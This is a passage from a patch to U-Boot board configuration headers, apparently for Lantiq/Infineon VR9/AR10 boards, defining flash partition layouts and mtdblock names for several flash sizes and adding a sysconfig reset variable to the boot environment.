+  #define IFX_CFG_FLASH_DECT_CFG_END_ADDR            0x0708003FF
+  #define IFX_CFG_FLASH_DECT_CFG_MTDBLOCK_NAME       "/dev/mtdblock6"
+
+  #define IFX_CFG_FLASH_END_ADDR                          0x07FFFFFF
+#elif (IFX_CONFIG_FLASH_SIZE == 128) && defined(CONFIG_NAND_ECC_HW)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00100000\0"                                      \
+        "part2_begin=0x00200000\0"                                      \
+        "part3_begin=0x00400000\0"                                      \
+        "part4_begin=0x07400000\0"                                      \
+        "part5_begin=0x07500000\0"                                      \
+        "part6_begin=0x07600000\0"                                      \
+        "total_part=7\0"
+
+#if !defined( CONFIG_AR10_GPHY_FW_EMBEDDED )
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_GPHY_FIRMWARE_IMAGE_BLOCK_NAME "\0"        \
+        "data_block2=" IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME "\0"     \
+        "data_block3=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block4=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block5=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block6=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block7=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"      \
+        "total_db=8\0"
+#else
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME "\0"     \
+        "data_block2=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block4=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block5=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block6=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"      \
+        "total_db=7\0"
+#endif
+
+    #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME            "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR            0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                  0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME         "/dev/mtdblock0"
+
+#if !defined( CONFIG_AR10_GPHY_FW_EMBEDDED )
+  #define IFX_CFG_FLASH_GPHY_FIRMWARE_IMAGE_BLOCK_NAME            "gphy_firmware"
+  #define IFX_CFG_FLASH_GPHY_FIRMWARE_IMAGE_START_ADDR            0x400000
+  #define IFX_CFG_FLASH_GPHY_FIRMWARE_IMAGE_SIZE                  0
+  #define IFX_CFG_FLASH_GPHY_FIRMWARE_IMAGE_MTDBLOCK_NAME         "/dev/mtdblock1"
+#endif
+
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME         "firmware"
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_START_ADDR         0x00100000
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_SIZE               0
+#if !defined( CONFIG_VR9_GPHY_FW_EMBEDDED )
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_MTDBLOCK_NAME      "/dev/mtdblock2"
+#else
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_MTDBLOCK_NAME      "/dev/mtdblock1"
+#endif
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME           "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR           0x00200000
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                 0
+#if !defined( CONFIG_VR9_GPHY_FW_EMBEDDED )
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock3"
+#else
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock2"
+#endif
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME           "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR           0x00400000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                 0
+#if !defined( CONFIG_VR9_GPHY_FW_EMBEDDED )
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock4"
+#else
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock3"
+#endif
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME             "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR             0x07400000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                   0x100000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR               0x074FFFFF
+#if !defined( CONFIG_VR9_GPHY_FW_EMBEDDED )
+  #define IFX_CFG_FLASH_SYSTEM_CFG_MTDBLOCK_NAME          "/dev/mtdblock5"
+#else
+  #define IFX_CFG_FLASH_SYSTEM_CFG_MTDBLOCK_NAME          "/dev/mtdblock4"
+#endif
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME              "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR              0x07500000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                    0x10000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR                0x075FFFFF
+#if !defined( CONFIG_VR9_GPHY_FW_EMBEDDED )
+  #define IFX_CFG_FLASH_UBOOT_CFG_MTDBLOCK_NAME           "/dev/mtdblock6"
+#else
+  #define IFX_CFG_FLASH_UBOOT_CFG_MTDBLOCK_NAME           "/dev/mtdblock5"
+#endif
+
+  #define IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME          "dectconfig"
+  #define IFX_CFG_FLASH_DECT_CFG_START_ADDR          0x07600000
+  #define IFX_CFG_FLASH_DECT_CFG_SIZE                0x10000
+  #define IFX_CFG_FLASH_DECT_CFG_END_ADDR            0x0760FFFF
+#if !defined( CONFIG_VR9_GPHY_FW_EMBEDDED )
+  #define IFX_CFG_FLASH_DECT_CFG_MTDBLOCK_NAME       "/dev/mtdblock7"
+#else
+  #define IFX_CFG_FLASH_DECT_CFG_MTDBLOCK_NAME       "/dev/mtdblock6"
+#endif
+
+  #define IFX_CFG_FLASH_END_ADDR                          0x07FFFFFF
+
+#elif (IFX_CONFIG_FLASH_SIZE == 512)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00040000\0"                                      \
+        "part2_begin=0x000C0000\0"                                      \
+        "total_part=3\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME "\0"     \
+        "data_block2=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block4=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block5=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block6=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"      \
+        "total_db=7\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME            "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR            0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                  0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME         "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME         "firmware"
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_START_ADDR         0x00040000
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_SIZE               0
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_MTDBLOCK_NAME      "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME           "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR           0x000C0000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                 0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock2"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME           "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR           0x007EDFFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                 0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME             "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR             0x007EE000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                   0x10000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR               0x007FDFFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME              "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR              0x007FE000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                    0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR                0x007FEFFF
+
+  #define IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME          "dectconfig"
+  #define IFX_CFG_FLASH_DECT_CFG_START_ADDR          0x007FF000
+  #define IFX_CFG_FLASH_DECT_CFG_SIZE                0x400
+  #define IFX_CFG_FLASH_DECT_CFG_END_ADDR            0x007FF3FF
+  
+ 
+  #define IFX_CFG_FLASH_END_ADDR                          0x007FFFFF
+
+#elif (IFX_CONFIG_FLASH_SIZE == 2048)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00100000\0"                                      \
+        "part2_begin=0x00200000\0"                                      \
+        "part3_begin=0x00400000\0"                                      \
+        "part4_begin=0x07400000\0"                                      \
+        "part5_begin=0x07500000\0"                                      \
+        "part6_begin=0x07600000\0"                                      \
+        "total_part=7\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME "\0"     \
+        "data_block2=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block4=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block5=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block6=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"      \
+        "total_db=7\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME            "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR            0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                  0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME         "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME         "firmware"
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_START_ADDR         0x00100000
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_SIZE               0
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_MTDBLOCK_NAME      "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME           "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR           0x00200000
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                 0
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock2"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME           "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR           0x00400000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                 0x07000000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock3"
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME             "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR             0x07400000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                   0x100000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR               0x074FFFFF
+  #define IFX_CFG_FLASH_SYSTEM_CFG_MTDBLOCK_NAME          "/dev/mtdblock4"
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME              "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR              0x07500000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                    0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR                0x075FFFFF
+  #define IFX_CFG_FLASH_UBOOT_CFG_MTDBLOCK_NAME           "/dev/mtdblock5"
+
+  #define IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME          "dectconfig"
+  #define IFX_CFG_FLASH_DECT_CFG_START_ADDR          0x07600000
+  #define IFX_CFG_FLASH_DECT_CFG_SIZE                0x10000
+  #define IFX_CFG_FLASH_DECT_CFG_END_ADDR            0x076FFFFF
+  #define IFX_CFG_FLASH_DECT_CFG_MTDBLOCK_NAME       "/dev/mtdblock6"
+
+  #define IFX_CFG_FLASH_END_ADDR                          0x07FFFFFF
+
+#elif (IFX_CONFIG_FLASH_SIZE == 4096)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00100000\0"                                      \
+        "part2_begin=0x00200000\0"                                      \
+        "part3_begin=0x00400000\0"                                      \
+        "part4_begin=0x07400000\0"                                      \
+        "part5_begin=0x07500000\0"                                      \
+        "part6_begin=0x07600000\0"                                      \
+        "total_part=7\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME "\0"     \
+        "data_block2=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block4=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block5=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block6=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"      \
+        "total_db=7\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME            "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR            0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                  0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME         "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME         "firmware"
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_START_ADDR         0x00100000
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_SIZE               0
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_MTDBLOCK_NAME      "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME           "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR           0x00200000
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                 0
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock2"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME           "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR           0x00400000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                 0x07000000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock3"
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME             "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR             0x07400000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                   0x100000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR               0x074FFFFF
+  #define IFX_CFG_FLASH_SYSTEM_CFG_MTDBLOCK_NAME          "/dev/mtdblock4"
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME              "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR              0x07500000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                    0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR                0x075FFFFF
+  #define IFX_CFG_FLASH_UBOOT_CFG_MTDBLOCK_NAME           "/dev/mtdblock5"
+
+  #define IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME          "dectconfig"
+  #define IFX_CFG_FLASH_DECT_CFG_START_ADDR          0x07600000
+  #define IFX_CFG_FLASH_DECT_CFG_SIZE                0x10000
+  #define IFX_CFG_FLASH_DECT_CFG_END_ADDR            0x076FFFFF
+  #define IFX_CFG_FLASH_DECT_CFG_MTDBLOCK_NAME       "/dev/mtdblock6"
+
+  #define IFX_CFG_FLASH_END_ADDR                          0x07FFFFFF
+
+#else
+  #error "ERROR!! Define flash size first!"
+#endif
+
+#endif /*CONFIG_FIRMWARE_IN_ROOTFS*/
+
+
+#endif /*CONFIG_BOOT_FROM_SPI*/
+
+
+/* End of Board specific configurations
+ *-----------------------------------------------------------------------
+ */
+
+/*************************************************************************/
+
diff --git a/include/configs/lq_extra_env.h b/include/configs/lq_extra_env.h
--- a/include/configs/lq_extra_env.h
+++ b/include/configs/lq_extra_env.h
@@ -67,7 +67,8 @@
 #endif
 #ifndef CONFIG_ENV_IS_NOWHERE 
   "reset_uboot_config="CONFIG_RESET_UBOOT_CONFIG"\0" 
-  "reset_ddr_config="CONFIG_RESET_DDR_CONFIG"\0" 
+  "reset_ddr_config="CONFIG_RESET_DDR_CONFIG"\0"
+  "reset_sysconfig="CONFIG_RESET_SYSCONFIG"\0"
   "mtdparts="CONFIG_MTDPARTS"\0"                     
   IFX_CFG_FLASH_PARTITIONS_INFO   
   "flash_end=" MK_STR(IFX_CFG_FLASH_END_ADDR) "\0"   
